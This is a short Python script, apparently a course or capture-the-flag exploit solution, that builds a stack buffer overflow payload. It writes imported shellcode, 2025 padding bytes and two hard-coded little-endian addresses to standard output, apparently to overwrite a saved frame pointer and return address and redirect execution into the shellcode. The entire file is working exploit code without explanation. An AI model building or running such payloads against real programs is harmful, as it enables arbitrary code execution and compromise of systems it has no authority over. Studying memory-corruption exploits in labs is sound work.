from shellcode import shellcode
from struct import pack
import sys


def main():
	sys.stdout.buffer.write(shellcode + ('\x22' * 2025).encode('ASCII') + pack('<I', 0xfffe82a8) + pack('<I', 0xfffe8abc))



if __name__ == "__main__":
	main()